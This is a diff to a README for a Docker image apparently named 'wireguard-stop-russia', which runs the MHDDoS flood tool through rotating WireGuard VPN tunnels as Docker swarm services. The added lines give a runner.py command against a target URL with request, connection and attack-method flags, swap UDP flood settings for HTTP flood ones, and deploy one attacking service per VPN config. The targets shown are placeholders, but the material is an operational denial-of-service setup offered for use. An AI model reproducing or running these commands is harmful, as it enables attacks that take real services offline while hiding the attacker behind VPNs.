@@ -27,19 +27,29 @@
     DOCKER_BUILDKIT=1 docker build --tag wireguard-stop-russia . 
     ```
 
+# Image based on this tutorial - [link](https://telegra.ph/MHDDoS-na-prokachku-03-11)
 ``` bash
 # Init docker swarm
 docker swarm init --advertise-addr $(hostname -i)
 # If you dot an error please use next command:  
 docker swarm init
+```
+``` bash
+# Example: 
+python3 runner.py https://example.com/ -t 1000 -p 300 --rpc 100 --http-methods ovh --debug
+```
+* VPN needs only for UDP and it will be started automatically
+``` bash
 # Create services with wireguard configs
 # One wireguard config == 1 service with 1 replica
 export WG_CONF_DIR=/home/$USER/wireguard-conf
 export WIREGUARD_PORT=51820
-export METHOD=udp
-export IP_PORT=1.1.1.1:53 # Example!!! Don't use 1.1.1.1
-export THREADS=2000
-export DURATION=3600
+export TARGET='https://example.com/'
+export METHOD=ovh
+export REQUESTS_COUNT=1000
+export CONNECTIONS=100
+export ATTACK_PERIOD=300
+
 for i in $(ls $WG_CONF_DIR); do arrIN=(${i//./ }); name=${arrIN[0]}; export WIREGUARD_CLIENT_CONFIG="$WG_CONF_DIR/$i"; docker stack deploy -c docker-compose.yml $name; sleep 1; done
 
 # Delete services
